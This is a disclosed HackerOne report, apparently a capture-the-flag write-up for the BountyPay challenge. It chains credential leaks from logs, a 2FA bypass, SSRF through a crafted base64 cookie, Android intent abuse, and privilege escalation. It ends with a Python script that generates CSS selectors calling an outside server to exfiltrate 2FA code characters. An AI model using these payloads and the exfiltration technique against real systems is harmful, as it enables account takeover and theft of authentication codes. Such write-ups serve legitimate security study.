{
  "id": 893305,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTMzMDU=",
  "url": "https://hackerone.com/reports/893305",
  "title": "[H1-2006 2020] CTF Writeup",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-06-07T19:06:53.015Z",
  "submitted_at": "2020-06-07T19:06:53.015Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "huerfano",
    "url": "/huerfano",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-06-22T22:58:02.255Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-22T21:29:04.747Z",
  "team_member_agreed_on_going_public_at": "2020-06-22T22:58:02.175Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n \n### Multiple Vulnerabilities leading to full account takeover and access to restricted functions\n\n1. Information Disclosure\n2. Login 2FA Bypass\n3. SSRF\n4. Hardcoded validation\n5. Sensitive information disclosure\n6. Privilege Escalation\n7. Payments 2FA Bypass through SSRF\n\n\n## Steps To Reproduce:\n  \n0. Recon\n---------------------\nI got some information about the subdomains with certspotter\n\n```bash\ncertspotter bountypay.h1ctf.com\n\napi.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\nbountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\nstaff.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\n```\n  \n1. Information Disclosure\n---------------------\n\nDoing some directory brute force to https://app.bountypay.h1ctf.com found a /.git/ directory with config file.\n\n{F858119}\n\nThis config file is linked to a github repo https://github.com/bounty-pay-code/request-logger.git\n\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nIn this repo exist only one file called logger.php who explains how the website logs request and looks like this\n```\n<?php\n$data = array(\n  'IP'        =>  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =>  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =>  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =>  array(\n      'GET'   =>  $_GET,\n      'POST'  =>  $_POST\n  )\n);\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\nin simple words, every line contains the timestamp and a base 64 encoded json string with request information. Then looked for bp_web_trace.log in https://app.bountypay.h1ctf.com/bp_web_trace.log and decoded the base64 string:\n\n```bash\nOriginal:\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\nDecoded:\n1588931909:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n1588931919:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n1588931928:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n1588931945:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n\n```\nBingo! got first credentials\n\n__username__: brian.oliver\n__password__: V7h0inzX\n  \n2. Login 2FA Bypass\n---------------------\nLogging in with this credentials there was a 2FA \n\n{F858126}\n\nThis form contains a hidden field called challenge with md5 hash and the challenge_answer with user input.\n\n```html\n<form method=\"post\" action=\"/\">\n    <input type=\"hidden\" name=\"username\" value=\"brian.oliver\">\n    <input type=\"hidden\" name=\"password\" value=\"V7h0inzX\">\n    <input type=\"hidden\" name=\"challenge\" value=\"832985fb487bcae88db2fc144fc15378\">\n    <div class=\"panel panel-default\" style=\"margin-top:50px\">\n        <div class=\"panel-heading\">Login</div>\n        <div class=\"panel-body\">\n            <div style=\"margin-top:7px\"><label>For Security we've sent a 10 character password to your mobile phone, please enter it below</label></div>\n            <div style=\"margin-top:7px\"><label>Password contains characters between A-Z , a-z and 0-9</label></div>\n            <div><input name=\"challenge_answer\" class=\"form-control\"></div>\n        </div>\n    </div>\n    <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n</form>\n```\nAfter some tests i realized the challenge field is just md5(challenge_answer) and does not validate the number of characters of the answer. \nSo if you send:\n\nchallenge = 0cc175b9c0f1b6a831c399e269772661 -> md5(a)   or any string\nchallenge_answer = a\n\nYou can bypass 2FA. \n\n3. Server Side Request Forgery\n---------------------\nIn the user session the pay button makes a get request to statements?month=MONTH_NUMBER&year=YEAR and get a json response. Making a request with month=05 and year=2020 i got:\n\n```json\n{\n  \"url\": \"https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=05&year=2020\",\n  \"data\": \"{\\\"description\\\":\\\"Transactions for 2020-05\\\",\\\"transactions\\\":[]}\"\n}\n```\n\nAdditionally, the cookie is a base64-encoded json string\n\n```bash\neyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\ndecoded:\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\nSo, the account_id is in the response and should be usefull to get SSRF.\n\nGoing to https://api.bountypay.h1ctf.com/ found \n\n```html\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <div class=\"text-center\" style=\"margin-top:30px\"><img src=\"/images/bountypay.png\" height=\"150\"></div>\n            <h1 class=\"text-center\">BountyPay API</h1>\n            <p style=\"text-align: justify\">Our BountyPay API controls all of our services in one place. We use a <a href=\"/redirect?url=https://www.google.com/search?q=REST+API\">REST API</a> with JSON output. If you are interested in using this API please contact your account manager.</p>\n        </div>\n    </div>\n</div>\n```\n\nThis url https://api.bountypay.h1ctf.com/redirect?url= has a whitelist and cannot \"redirect\" to any site so i had to move on a little.\nOn the other side, the url https://software.bountypay.h1ctf.com/ shows an 401 Unauthorized message.\n\n{F858176}\n\nThe message \"You do not have permission to access this server from your IP Address\" is the hint to test this url in redirect.\n\nTesting redirect with software url https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/ from cookie like this:\n```bash\ndecoded:\n{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n\nbase64-encoded:\neyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=\n```\nResponse \n```html\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 15:10:37 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 1605\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/#\\/statements?month=04&year=2020\",\"data\":\"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n    <meta charset=\\\"utf-8\\\">\\n    <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\">\\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1\\\">\\n    <title>Software Storage<\\/title>\\n    <link href=\\\"\\/css\\/bootstrap.min.css\\\" rel=\\\"stylesheet\\\">\\n<\\/head>\\n<body>\\n\\n<div class=\\\"container\\\">\\n    <div class=\\\"row\\\">\\n        <div class=\\\"col-sm-6 col-sm-offset-3\\\">\\n            <h1 style=\\\"text-align: center\\\">Software Storage<\\/h1>\\n            <form method=\\\"post\\\" action=\\\"\\/\\\">\\n                <div class=\\\"panel panel-default\\\" style=\\\"margin-top:50px\\\">\\n                    <div class=\\\"panel-heading\\\">Login<\\/div>\\n                    <div class=\\\"panel-body\\\">\\n                        <div style=\\\"margin-top:7px\\\"><label>Username:<\\/label><\\/div>\\n                        <div><input name=\\\"username\\\" class=\\\"form-control\\\"><\\/div>\\n                        <div style=\\\"margin-top:7px\\\"><label>Password:<\\/label><\\/div>\\n                        <div><input name=\\\"password\\\" type=\\\"password\\\" class=\\\"form-control\\\"><\\/div>\\n                    <\\/div>\\n                <\\/div>\\n                <input type=\\\"submit\\\" class=\\\"btn btn-success pull-right\\\" value=\\\"Login\\\">\\n            <\\/form>\\n        <\\/div>\\n    <\\/div>\\n<\\/div>\\n<script src=\\\"\\/js\\/jquery.min.js\\\"><\\/script>\\n<script src=\\\"\\/js\\/bootstrap.min.js\\\"><\\/script>\\n<\\/body>\\n<\\/html>\"}\n```\nGot SSRF!\n\nAt this time, just need to find some sensitive directory or file in software subdomain, so i generate a cookie payload list with python using the dirsearch dictionary, import it in burp intruder and process payload with base64 encoding.\n\n```\n#!/usr/bin/python3\nfile = open(\"payloads.txt\",\"a\") \nwith open('dicc.txt') as fp:\n   line = fp.readline()\n   while line:\n       url = 'https://software.bountypay.h1ctf.com/{}/#'.format(line.strip())\n       l = '{\"account_id\":\"../../redirect?url=%s\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}' % url\n       file.write(l+'\\n') \n       line = fp.readline()\nfile.close()\n```\nSend the request to intruder and import payload list.\n{F858200}\n{F858201}\n\nThen found an apk in https://software.bountypay.h1ctf.com/uploads/BountyPay.apk  \nTime to analize apk file!\n\n4. Hardcoded validation\n---------------------\n\nExtracting apk file and reading AndroidManifest.xml got some interesting information\n\n```xml\n<activity android:label=\"@string/title_activity_part_three\" android:name=\"bounty.pay.PartThreeActivity\" android:theme=\"@style/AppTheme.NoActionBar\">\n            <intent-filter android:label=\"\">\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:host=\"part\" android:scheme=\"three\"/>\n            </intent-filter>\n        </activity>\n        <activity android:label=\"@string/title_activity_part_two\" android:name=\"bounty.pay.PartTwoActivity\" android:theme=\"@style/AppTheme.NoActionBar\">\n            <intent-filter android:label=\"\">\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:host=\"part\" android:scheme=\"two\"/>\n            </intent-filter>\n        </activity>\n        <activity android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\" android:theme=\"@style/AppTheme.NoActionBar\">\n            <intent-filter android:label=\"\">\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:host=\"part\" android:scheme=\"one\"/>\n            </intent-filter>\n        </activity>\n```\n\nUsing dex2jar to get jar file from apk and openning jar file with JDGui\n```\ndex2jar BountyPay.apk\n```\n\n{F858209}\n\nPartOneActivity\n```java\n if (getIntent() != null && getIntent().getData() != null) {\n      String str = getIntent().getData().getQueryParameter(\"start\");\n      if (str != null && str.equals(\"PartTwoActivity\") && sharedPreferences.contains(\"USERNAME\")) {\n        str = sharedPreferences.getString(\"USERNAME\", \"\");\n        SharedPreferences.Editor editor = sharedPreferences.edit();\n        String str1 = sharedPreferences.getString(\"TWITTERHANDLE\", \"\");\n        editor.putString(\"PARTONE\", \"COMPLETE\").apply();\n        logFlagFound(str, str1);\n        startActivity(new Intent(this, PartTwoActivity.class));\n      } \n    } \n```\nPart one require an intent with start parameter equals to \"PartTwoActivity\". An reading the intents in manifest\n\n```xml\n<data android:host=\"part\" android:scheme=\"one\"/>\n<data android:host=\"part\" android:scheme=\"two\"/>\n<data android:host=\"part\" android:scheme=\"three\"/>\n```\n\nSending intent with adb.\n\n```bash\nadb shell am start -a \"android.intent.action.VIEW\" -d \"one://part?start=PartTwoActivity\"\n```\nSame method in PartTwoActivity\n\n```java\nif (getIntent() != null && getIntent().getData() != null) {\n      Uri uri = getIntent().getData();\n      String str1 = uri.getQueryParameter(\"two\");\n      String str2 = uri.getQueryParameter(\"switch\");\n      if (str1 != null && str1.equals(\"light\") && str2 != null && str2.equals(\"on\")) {\n        editText.setVisibility(0);\n        button.setVisibility(0);\n        textView.setVisibility(0);\n      } \n    } \n```\n```bash\nadb shell am start -a \"android.intent.action.VIEW\" -d \"two://part?two=light\\&switch=on\"\n```\nNow some md5 hash is on the screen, copy it and try to crack it.\n\n459a6f79ad9b13cbcb5f692d2cc7a94d = Token\n\nFinally PartThreeActivity\n```java\nif (getIntent() != null && getIntent().getData() != null) {\n      Uri uri = getIntent().getData();\n      final String firstParam = uri.getQueryParameter(\"three\");\n      final String secondParam = uri.getQueryParameter(\"switch\");\n      final String thirdParam = uri.getQueryParameter(\"header\");\n      byte[] arrayOfByte2 = Base64.decode(str1, 0);\n      byte[] arrayOfByte1 = Base64.decode(str2, 0);\n      final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);\n      final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);\n      this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n            public void onCancelled(DatabaseError param1DatabaseError) { Log.e(\"TAG\", \"onCancelled\", param1DatabaseError.toException()); }\n            public void onDataChange(DataSnapshot param1DataSnapshot) {\n              String str = (String)param1DataSnapshot.getValue();\n              if (firstParam != null && decodedFirstParam.equals(\"PartThreeActivity\") && secondParam != null && decodedSecondParam.equals(\"on\")) {\n                String str1 = thirdParam;\n                if (str1 != null) {\n                  StringBuilder stringBuilder = new StringBuilder();\n                  stringBuilder.append(\"X-\");\n                  stringBuilder.append(str);\n                  if (str1.equals(stringBuilder.toString())) {\n                    editText.setVisibility(0);\n                    button.setVisibility(0);\n                    PartThreeActivity.this.thread.start();\n                  } \n                } \n              } \n            }\n          });\n    } \n```\n\nthree=base64('PartThreeActivity')\nswitch=base64('on')\n\n```bash\nadb shell am start -a \"android.intent.action.VIEW\" -d \"three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\&switch=b24=\\&header=X-Token\"\n```\nIn other window i started logcat to capture app output.\n\n```bash\nadb -d logcat bounty.pay:I\n```\n{F858224}\n\n```bash\nHOST IS: : http://api.bountypay.h1ctf.com\nTOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1\nHEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\nInsert leaked hash and submit.\n\n{F858220}\nBingo! all android challenges completed.\n\n5. Sensitive information disclosure\n---------------------\nAt this time i can consume api with X-Token.\n\nBrute forcing api directories to get endpoints to consume.\n\n```bash\n400 -   22B  - /api/accounts/login\n400 -   22B  - /api/accounts/signin\n400 -   22B  - /api/accounts/logon\n200 -  104B  - /api/staff\n200 -  104B  - /api/staff/\n```\nThen open https://api.bountypay.h1ctf.com/api/staff and send to burp repeater to add X-Token header\n\nRequest\n```bash\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\nResponse\n``` bash\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 17:13:50 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 104\n\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\n\nChanging the request to POST and sent staff_id with retrieved data\nrequest:\n```bash\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\nstaff_id=STF:KE624RQ2T9\n```\nResponse\n```bash\nHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 17:16:32 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 39\n\n[\"Staff Member already has an account\"]\n```\nSo i needed to find a new staff member to activate.\nGot twitter information from https://twitter.com/BountypayHQ  and found a welcome tweet https://twitter.com/BountypayHQ/status/1258692286256500741\nThere is the new member and need to activate her account.\n\nLooking for who is following bountypayhq account\nhttps://twitter.com/bountypayhq/following\n\nAnd finally found Sandra's twitter account \nhttps://twitter.com/SandraA76708114\n\n{F858267}\n\nSo finally got the staff id to activate the account.\n\n```\nstaff_id=STF:8FJ3KFISL3\n```\n```\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 17:38:13 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\nBingo! got another credentials\n\n__username__: sandra.allison\n__password__: s%3D8qB8zEpMnc*xsz7Yp5\n\nTime to log in https://staff.bountypay.h1ctf.com/\n\n6. Privilege Escalation\n---------------------\nAfter logging in staff site, found some interesting function.\n\nAvatar change: sets avatar value in div class\n\nwebsite.js: \n```javascript\n$('.upgradeToAdmin').click(function () {\n  let t = $('input[name=\"username\"]').val();\n  $.get('/admin/upgrade?username=' + t, function () {\n    alert('User Upgraded to Admin')\n  })\n}),\n$('.tab').click(function () {\n  return $('.tab').removeClass('active'),\n  $(this).addClass('active'),\n  $('div.content').addClass('hidden'),\n  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),\n  !1\n}),\n$('.sendReport').click(function () {\n  $.get('/admin/report?url=' + url, function () {\n    alert('Report sent to admin team')\n  }),\n  $('#myModal').modal('hide')\n}),\ndocument.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));\n```\nSo, there is a way to escalate privileges reporting a url who triggers upgradeToAdmin function with sandra.allison username.\nChanging avatar to \"tab4 upgradeToAdmin\" i can control the execution of upgradeToAdmin function through url with #tab4, but the username was undefined.\n```\nhttps://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab4 \n```\nto avoid undefined username, tried to get login template and ticket template together. Then had everything working together and reported base64 encoded path.\n\n```\ndecoded\n/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4\n\nencoded\nLz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQK\n```\nGot admin privileges and another credentials.\n\n__username__: marten.mickos\n__password__: h&H5wy2Lggj*kKn4OD&Ype\n\nFinally, Marten Mickos account! \nTime to go back to https://app.bountypay.h1ctf.com/\n\n7. Payments 2FA Bypass through SSRF\n---------------------\nLogged in with marten.mickos credentials and bypassing 2FA mentioned before (1), retrieved payments for 05/2020\n{F858290}\n\nPressing pay button got new 2FA page.\n{F858292}\n\nAnalyzing send challenge request\n```\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nOrigin: https://app.bountypay.h1ctf.com\nConnection: close\nReferer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\nUpgrade-Insecure-Requests: 1\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\nThe request sends a css url, so tried the same request with my server url got request from remote server...and SSRF again!.\n\n```\n3.21.98.146 - - [07/Jun/2020 18:11:47] code 404, message File not found\n3.21.98.146 - - [07/Jun/2020 18:11:47] \"GET /test HTTP/1.1\" 404 -\n```\nReading something about css data exfiltration, i found something who helped me and created python script.\n\n```python\n#/bin/python3\n\nimport string\n\ncss = 'css/uni_2fa_style.css'\nhostname = 'https://leoastorga.com:3000'\n\ndef name(x):\n    file = open(css,'w')\n    for s in (string.ascii_letters + string.digits + '-_'):\n        line = \"input[name^='%s'] {background: url('%s/%s');}\" % (x+s, hostname, x+s)\n        print(line)\n        file.write(line+'\\n')\n    file.close()\n\nif __name__ == \"__main__\":\n    input = input(\"str: \")\n    while(input != 'exit'):\n        name(input)\n        input = input(\"str: \")\n```\n\nSent my css url and executing python script to update it, retrieved information about field names. There is a input field for each character!!\n```\napp_style=https://leoastorga.com:3000/css/uni_2fa_style.css\n```\n```\n3.21.98.146 - - [07/Jun/2020 18:23:56] \"GET /css/uni_2fa_style.css HTTP/1.1\" 200 -\n3.21.98.146 - - [07/Jun/2020 18:23:56] \"GET /c HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:00] \"GET /css/uni_2fa_style.css HTTP/1.1\" 200 -\n3.21.98.146 - - [07/Jun/2020 18:24:01] \"GET /co HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:08] \"GET /css/uni_2fa_style.css HTTP/1.1\" 200 -\n3.21.98.146 - - [07/Jun/2020 18:24:08] \"GET /cod HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:14] \"GET /css/uni_2fa_style.css HTTP/1.1\" 200 -\n3.21.98.146 - - [07/Jun/2020 18:24:15] \"GET /code HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:21] \"GET /css/uni_2fa_style.css HTTP/1.1\" 200 -\n3.21.98.146 - - [07/Jun/2020 18:24:21] \"GET /code_ HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:29] \"GET /css/uni_2fa_style.css HTTP/1.1\" 200 -\n3.21.98.146 - - [07/Jun/2020 18:24:30] \"GET /code_7 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:30] \"GET /code_1 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:30] \"GET /code_2 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:30] \"GET /code_3 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:30] \"GET /code_4 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:30] \"GET /code_5 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:24:30] \"GET /code_6 HTTP/1.1\" 404 -\n```\n\nadding some function to my python script to retrieve the information for each field.\n\n```python\n#/bin/python3\nimport string\n\ncss = 'css/uni_2fa_style.css'\nhostname = 'https://leoastorga.com:3000'\n\ndef name(x):\n    file = open(css,'w')\n    for s in (string.ascii_letters + string.digits + '-_'):\n        line = \"input[name^='%s'] {background: url('%s/%s');}\" % (x+s, hostname, x+s)\n        print(line)\n        file.write(line+'\\n')\n    file.close()\n\ndef value():\n    file = open(css,'w')\n    for s in (string.ascii_letters + string.digits):\n        for i in range(1,8):\n            line = \"input[name='code_%d'][value^='%s'] {background: url('%s/%d_%s');}\" % (i, s, hostname, i, s)\n            print(line)\n            file.write(line+'\\n')\n    file.close()\n\nif __name__ == \"__main__\":\n    value()\n    #input = input(\"str: \")\n    #while(input != 'exit'):\n    #    name(input)\n    #    input = input(\"str: \")\n```\nThen executed every thing together and got the following response\n```\n3.21.98.146 - - [07/Jun/2020 18:17:59] \"GET /css/uni_2fa_style.css HTTP/1.1\" 200 -\n3.21.98.146 - - [07/Jun/2020 18:18:00] \"GET /7_i HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:18:00] \"GET /1_0 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:18:00] \"GET /2_8 HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:18:00] \"GET /3_P HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:18:00] \"GET /4_V HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:18:00] \"GET /5_F HTTP/1.1\" 404 -\n3.21.98.146 - - [07/Jun/2020 18:18:00] \"GET /6_J HTTP/1.1\" 404 -\n```\nSort by field number got \"O8PVFJi\", sent the 2FA code and paid the bountys!\n\n{F858313}\n\nFlag: ==^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$==\n\n## Supporting Material/References:\nhttps://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/\n\n## Impact\n\nBy chaining multiple vulnerabilities attacker can achieve full account takeover and access to restricted functions.",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 858119,
      "file_name": "1-dirsearch.png",
